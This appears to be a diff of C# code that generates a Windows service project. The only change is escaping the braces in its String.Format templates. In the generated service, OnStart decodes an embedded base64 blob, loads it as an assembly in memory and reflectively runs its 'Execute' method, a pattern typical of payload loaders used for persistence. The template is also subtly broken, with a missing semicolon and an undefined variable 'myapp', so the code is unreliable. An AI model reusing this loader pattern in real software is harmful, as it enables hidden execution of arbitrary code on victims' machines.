@@ -771,32 +771,32 @@ using System.Text;
 using System.Reflection;
 
 namespace {2}
-{
+{{
     public partial class {3} : ServiceBase
-    {
+    {{
         public string TargetAssemblyName = ""{3}.{4}"";
         public string TargetMethodName = ""Execute"";
 
         public {3}()
-        {
+        {{
             InitializeComponent();
-        }
+        }}
 
         protected override void OnStart(string[] args)
-        {
+        {{
             byte[]  data = System.Convert.FromBase64String(""{4}"")
             Assembly a = Assembly.Load(myapp);
             Type myType = a.GetType(TargetAssemblyName);
             MethodInfo myMethod = myType.GetMethod(TargetMethodName);
             object obj = Activator.CreateInstance(myType);
             myMethod.Invoke(obj, null);
-        }
+        }}
 
         protected override void OnStop()
-        {
-        }
-    }
-}
+        {{
+        }}
+    }}
+}}
 ", aGuid, projDir, DefaultServiceNamespace, DefaultServiceClassName, bin64);
       return content;
     }
@@ -805,30 +805,30 @@ namespace {2}
     {
       var content = String.Format(@"
 namespace {2}
-{
+{{
     partial class {3}
-    {
+    {{
         private System.ComponentModel.IContainer components = null;
         protected override void Dispose(bool disposing)
-        {
+        {{
             if (disposing && (components != null))
-            {
+            {{
                 components.Dispose();
-            }
+            }}
             base.Dispose(disposing);
-        }
+        }}
 
         #region Component Designer generated code
 
         private void InitializeComponent()
-        {
+        {{
             components = new System.ComponentModel.Container();
             this.ServiceName = ""{0}"";
-        }
+        }}
 
         #endregion
-    }
-}
+    }}
+}}
 ", aGuid, projDir, DefaultServiceNamespace, DefaultServiceClassName);
       return content;
     }
@@ -842,20 +842,20 @@ using System.ServiceProcess;
 using System.Text;
 
 namespace {2}
-{
+{{
     static class Program
-    {
+    {{
         static void Main()
-        {
+        {{
             ServiceBase[] ServicesToRun;
             ServicesToRun = new ServiceBase[]
-            {
+            {{
                 new {3}()
-            };
+            }};
             ServiceBase.Run(ServicesToRun);
-        }
-    }
-}
+        }}
+    }}
+}}
 ", aGuid, projDir, DefaultServiceNamespace, DefaultServiceClassName);
       return content;
     }
